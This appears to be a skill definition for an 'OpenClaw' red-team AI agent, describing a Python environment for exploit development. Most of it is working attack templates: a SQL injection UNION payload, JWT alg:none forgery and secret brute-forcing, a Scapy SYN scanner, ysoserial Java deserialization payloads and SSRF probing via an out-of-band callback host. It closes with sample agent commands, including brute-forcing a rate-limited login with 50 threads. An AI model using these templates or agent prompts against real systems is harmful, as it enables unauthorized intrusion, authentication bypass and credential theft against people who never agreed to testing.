---
name: python-runtime
description: |
  Sandboxed Python runtime environment for custom exploit development, payload crafting,
  vulnerability validation, and automated attack scripting. Provides a pre-loaded security
  library environment (requests, pwntools, impacket, cryptography, scapy) with structured
  exploit templates, interactive REPL for iterative testing, and safe subprocess execution.
  Supports rapid PoC development, binary exploitation, custom encoding/encryption, and
  network-layer scripting.
metadata:
  {
    "openclaw":
      {
        "emoji": "🐍",
        "requires": { "bins": ["python3"] },
        "install":
          [
            {
              "id": "pip-security-libs",
              "kind": "shell",
              "cmd": "pip3 install requests httpx pwntools scapy cryptography paramiko impacket pyopenssl",
              "bins": [],
              "label": "Install security Python libraries (pip)",
            },
          ],
      },
  }
---

# Python Runtime — Exploit Development & Validation

A security-focused Python environment with pre-loaded libraries for exploit development,
payload crafting, and vulnerability validation.

## Pre-Loaded Libraries

| Library              | Purpose                                        |
| -------------------- | ---------------------------------------------- |
| `requests` / `httpx` | HTTP exploitation, session handling            |
| `pwntools`           | Binary exploitation, CTF challenges            |
| `scapy`              | Network packet crafting and analysis           |
| `cryptography`       | Cipher attacks, JWT manipulation, key cracking |
| `impacket`           | SMB, Kerberos, LDAP, NTLM attacks              |
| `paramiko`           | SSH client/server automation                   |
| `pyOpenSSL`          | TLS/SSL vulnerability testing                  |

## Exploit Templates

### Template 1 — HTTP Exploit Skeleton

```python
#!/usr/bin/env python3
"""OpenClaw Exploit Template — HTTP Target"""
import requests, json, sys

TARGET = "https://target.com"
HEADERS = {
    "Content-Type": "application/json",
    "Authorization": "Bearer YOUR_TOKEN",
}

s = requests.Session()
s.headers.update(HEADERS)

def exploit(payload: dict) -> dict:
    """Send exploit payload and return parsed response."""
    resp = s.post(f"{TARGET}/api/vulnerable-endpoint", json=payload)
    print(f"[{resp.status_code}] {resp.url}")
    try:
        return resp.json()
    except Exception:
        return {"raw": resp.text[:500]}

if __name__ == "__main__":
    payload = {"id": "1 UNION SELECT username,password FROM users--"}
    result = exploit(payload)
    print(json.dumps(result, indent=2))
```

---

### Template 2 — JWT Manipulation

```python
#!/usr/bin/env python3
"""JWT attack toolkit — alg:none, weak secret, key confusion"""
import base64, json, hmac, hashlib

def decode_jwt(token: str) -> tuple[dict, dict, str]:
    parts = token.split(".")
    header  = json.loads(base64.b64decode(parts[0] + "=="))
    payload = json.loads(base64.b64decode(parts[1] + "=="))
    return header, payload, parts[2]

def forge_jwt_none_alg(payload: dict) -> str:
    """Create JWT with alg:none (authentication bypass)."""
    header = base64.urlsafe_b64encode(
        json.dumps({"alg":"none","typ":"JWT"}).encode()
    ).rstrip(b"=").decode()
    body = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).rstrip(b"=").decode()
    return f"{header}.{body}."

def brute_secret(token: str, wordlist: list[str]) -> str | None:
    """Brute-force JWT HS256 secret."""
    header_b64, payload_b64, sig_b64 = token.split(".")
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = base64.urlsafe_b64decode(sig_b64 + "==")
    for secret in wordlist:
        test_sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        if test_sig == sig:
            return secret
    return None

# Usage
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxx"
forged = forge_jwt_none_alg({"user": "admin", "role": "super_admin", "exp": 9999999999})
print(f"Forged alg:none JWT: {forged}")
```

---

### Template 3 — Custom Network Payload (Scapy)

```python
#!/usr/bin/env python3
"""Custom packet crafting for network-layer attacks."""
from scapy.all import IP, TCP, UDP, ICMP, Raw, send, sr1

TARGET_IP = "192.168.1.10"

# SYN scan
def syn_scan(host: str, ports: list[int]) -> dict:
    open_ports = {}
    for port in ports:
        pkt = IP(dst=host)/TCP(dport=port, flags="S")
        resp = sr1(pkt, timeout=1, verbose=0)
        if resp and TCP in resp and resp[TCP].flags == 0x12:  # SYN-ACK
            open_ports[port] = "open"
            send(IP(dst=host)/TCP(dport=port, flags="R"), verbose=0)
    return open_ports

# Custom UDP probe
def udp_probe(host: str, port: int, data: bytes = b"") -> bytes:
    pkt = IP(dst=host)/UDP(dport=port)/Raw(load=data)
    resp = sr1(pkt, timeout=2, verbose=0)
    return resp[Raw].load if resp and Raw in resp else b""

results = syn_scan(TARGET_IP, [22, 80, 443, 8080, 8443])
print(dict(results))
```

---

### Template 4 — Deserialization PoC (Java)

```python
#!/usr/bin/env python3
"""Generate and test Java deserialization payloads."""
import subprocess, base64, requests

def generate_ysoserial(gadget: str, command: str) -> bytes:
    """Generate payload using ysoserial."""
    result = subprocess.run(
        ["java", "-jar", "ysoserial.jar", gadget, command],
        capture_output=True
    )
    return result.stdout

def test_deser(url: str, payload: bytes, param: str = "data") -> str:
    """Send deserialization payload to endpoint."""
    b64_payload = base64.b64encode(payload).decode()
    resp = requests.post(url, data={param: b64_payload},
                         headers={"Content-Type": "application/x-java-serialized-object"})
    return f"[{resp.status_code}] {resp.text[:200]}"

# Example
payload = generate_ysoserial("CommonsCollections1", "id")
result  = test_deser("https://target.com/deserialize", payload)
print(result)
```

---

### Template 5 — SSRF with DNS Callback Validation

```python
#!/usr/bin/env python3
"""SSRF detection using DNS callback (requires Burp Collaborator or interactsh)."""
import requests, uuid, time

# Use interactsh for free OOB callbacks
INTERACTSH_HOST = "UNIQUE-ID.oast.fun"  # From: interactsh-client

def test_ssrf(url: str, param: str, values: list[str]) -> list[str]:
    """Test URL parameters for SSRF via DNS callback."""
    confirmed = []
    for value in values:
        # Embed unique OOB domain
        unique = f"{uuid.uuid4().hex}.{INTERACTSH_HOST}"
        ssrf_url = value.replace("CALLBACK", unique)
        try:
            requests.get(url, params={param: ssrf_url}, timeout=5)
        except Exception:
            pass
        print(f"  Sent: {ssrf_url}")
        confirmed.append(unique)  # Check interactsh console for DNS hits
    return confirmed

test_ssrf("https://target.com/fetch", "url", [
    "http://CALLBACK/",
    "https://CALLBACK/",
    "http://CALLBACK@trusted.com/",
])
```

---

## Interactive Development Mode

```bash
# Launch security-focused Python REPL
python3 -c "
import requests, json
from functools import partial

TARGET = 'https://target.com'
s = requests.Session()

# Helper shortcuts
get  = partial(s.get, timeout=10)
post = partial(s.post, timeout=10)

print('OpenClaw Python Runtime ready.')
print(f'Target: {TARGET}')
print('Use: get(TARGET), post(TARGET, json={...})')
"
```

## Usage from Red Team Agent

```
Develop a custom exploit for the SQL injection found in the id parameter at https://target.com/item
Generate a JWT with alg:none attack for the discovered token endpoint
Write a Python script to brute-force the rate-limited login page with 50 threads
Craft a custom Scapy probe for the UDP service on port 5060
```
